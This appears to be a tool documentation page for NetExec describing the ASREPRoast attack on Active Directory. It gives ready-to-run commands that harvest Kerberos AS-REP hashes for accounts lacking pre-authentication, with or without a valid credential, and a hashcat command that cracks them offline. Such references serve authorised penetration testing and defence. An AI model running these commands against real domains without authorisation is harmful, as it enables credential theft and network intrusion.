# ASREPRoasting

### Retrieve the Kerberos 5 AS-REP etype 23 hash of users without Kerberos pre-authentication required

## TIP: You can retrieve the Kerberos 5 AS-REP etype 23 hash of users without Kerberos pre-authentication required if you have a list of users on the domain

# Without authentication

### The ASREPRoast attack looks for users without Kerberos pre-authentication required. That means that anyone can send an AS_REQ request to the KDC on behalf of any of those users, and receive an AS_REP message. This last kind of message contains a chunk of data encrypted with the original user key, derived from its password. Then, by using this message, the user password could be cracked offline. 

#### nxc ldap 192.168.0.104 -u harry -p '' --asreproast output.txt

### Using a wordlist, you can find wordlists of username here

#### nxc ldap 192.168.0.104 -u user.txt -p '' --asreproast output.txt

### Set the password value to '' to perform the test without authentication

# With authentication

### If you have one valid credential on the domain, you can retrieve all the users and hashes where the Kerberos pre-authentication is not required

#### nxc ldap 192.168.0.104 -u harry -p pass --asreproast output.txt

## TIP: Use option kdcHost when the domain name resolution fail

#### nxc ldap 192.168.0.104 -u harry -p pass --asreproast output.txt --kdcHost domain_name

# Cracking with hashcat

### To crack hashes on the file output.txt with hashcat use the following options:

#### hashcat -m 18200 output.txt wordlist

